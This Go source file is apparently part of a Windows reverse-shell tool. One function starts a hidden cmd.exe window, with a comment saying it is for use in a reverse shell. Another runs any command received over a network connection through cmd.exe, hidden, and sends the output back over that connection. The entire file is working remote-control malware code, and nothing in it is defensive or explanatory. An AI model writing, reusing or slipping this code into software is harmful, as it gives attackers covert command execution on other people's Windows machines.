// +build windows !linux !darwin

package shell

import (
	"net"
	"os/exec"

	"golang.org/x/sys/windows"
)

// GetShell pops an *exec.Cmd and return it to be used in a reverse shell
func GetShell() *exec.Cmd {
	//cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	return cmd
}

// ExecuteCmd runs the provided command through cmd.exe & redirects the result to the net.Conn object.
func ExecuteCmd(command string, conn net.Conn) {
	//cmd_path := "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd_path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(cmd_path, "/c", command+"\n")
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
